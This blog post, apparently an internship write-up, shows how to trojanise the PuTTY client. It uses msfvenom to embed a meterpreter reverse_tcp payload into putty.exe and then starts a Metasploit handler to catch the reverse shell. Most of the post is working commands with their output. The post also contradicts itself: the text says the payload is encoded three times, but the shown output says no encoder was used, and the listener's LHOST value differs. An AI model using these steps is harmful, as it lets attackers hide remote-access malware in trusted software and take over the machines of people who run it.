---
title: Backdooring EXE Files
date: 2021-06-07T20:20:16+05:30
lastmod: 2021-06-07T20:20:16+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover:
  image: /img/blog.png
  alt: "cover image"

categories:
  - tuv
  - amity
  - internship
tags:
  - msfvenom
  - putty
  - backdoor

draft: false
description: Backdooring EXE Files

---
## Backdooring EXE Files

### overview

Creating customized backdoored executables often took a long period of time to do manually as attackers. The ability to embed a Metasploit Payload in any executable that you want is simply brilliant. When we say any executable, it means any executable. You want to backdoor something you download from the internet? How about iexplorer? Or explorer.exe or putty, any of these would work. The best part about it is its extremely simple. We begin by first downloading our legitimate executable, in this case, the popular PuTTY client.

### Downloading Legit application

```bash 
wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
--2021-06-07 20:22:36--  http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
Resolving the.earth.li (the.earth.li)... 93.93.131.124, 2a00:1098:86:4d:c0ff:ee:15:900d
Connecting to the.earth.li (the.earth.li)|93.93.131.124|:80... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe [following]
--2021-06-07 20:22:36--  https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe
Connecting to the.earth.li (the.earth.li)|93.93.131.124|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://the.earth.li/~sgtatham/putty/0.75/w32/putty.exe [following]
--2021-06-07 20:22:37--  https://the.earth.li/~sgtatham/putty/0.75/w32/putty.exe
Reusing existing connection to the.earth.li:443.
HTTP request sent, awaiting response... 200 OK
Length: 1179880 (1.1M) [application/x-msdos-program]
Saving to: ‘putty.exe’

putty.exe                           100%[=================================================================>]   1.12M   380KB/s    in 3.0s    

2021-06-07 20:22:41 (380 KB/s) - ‘putty.exe’ saved [1179880/1179880]
```

Next, we use msfvenom to inject a meterpreter reverse payload into our executable, encode it three times using shikata_ga_nai and save the backdoored file into our webroot directory.

## Backdooring the Application

```bash
msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.100.101 -f exe -o putty-malware.exe
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 1542144 bytes
Saved as: putty-malware.exe
```

### listener setup

```bash
msf > use exploit/multi/handler 
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp 
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.100.101
LHOST => 192.168.1.101
msf exploit(handler) > set LPORT 443
LPORT => 443
msf exploit(handler) > exploit

[*] Started reverse handler on 192.168.100.101:443 
[*] Starting the payload handler...
```

### Screen Shot From Windows System

![msf-payload](https://i.imgur.com/UvxDbqe.png)

---
